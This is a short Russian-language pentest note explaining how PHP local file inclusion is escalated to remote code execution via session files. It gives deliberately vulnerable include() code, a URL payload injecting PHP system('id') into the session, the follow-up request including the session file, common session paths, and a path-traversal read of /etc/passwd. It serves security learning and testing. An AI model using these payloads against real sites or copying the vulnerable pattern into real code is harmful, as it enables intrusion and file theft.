# PHP Session Files LFI → RCE

## Суть уязвимости:
Если приложение записывает пользовательский ввод в сессию и есть LFI, можно получить RCE.

## Как работает(УЧЕБНЫЙ ПРИМЕР! НА ПРАКТИКЕ ТАКОЕ НЕ ВСТРЕТИШЬ!):

<!-- Уязвимый код: СТРАНИЦА ЗАПИСЫВАЕТСЯ В СЕССИЮ-->     
* if(isset($_GET['page'])){
* $_SESSION['page'] = $_GET['page'];
* echo "You're currently in" . $_GET["page"];
* include($_GET['page']);
* }

**Шаг 1:** Инъекция кода в сессию
http://site.com/page=<?php system('id'); ?>

В сессионный файл запишется: page|s:20:"<?php system('id'); ?>";

**Шаг 2:** Включение сессионного файла
http://site.com/page=/var/lib/php/sessions/sess_[PHPSESSID]

PHP выполняет код внутри файла → RCE

## Пути к сессиям (Linux):
/var/lib/php/sessions/sess_[ID]
/var/lib/php/session/sess_[ID]
/tmp/sess_[ID]
/tmp/sessions/sess_[ID]

## PHPSESSID берется из cookies браузера

## Условия:
✅ LFI через include()/require()
✅ Приложение записывает в $_SESSION пользовательский ввод
❌ Не требует специальных настроек PHP

# Другой реальный пример:

### Выбор темы оформления
if(isset($_GET['theme'])){
    $_SESSION['theme'] = $_GET['theme'];  // Запоминаем тему
    include('themes/' . $_GET['theme']);   // LFI
}

# Запишем в сессию: theme|s:8:"../../../../../etc/passwd";
http://site.com/index.php?theme=../../../../../etc/passwd

# Смотрит PHPSESSID из cookie и выводим содержимое файла

http://site.com/index.php?page=/var/lib/php/sessions/sess_[ID]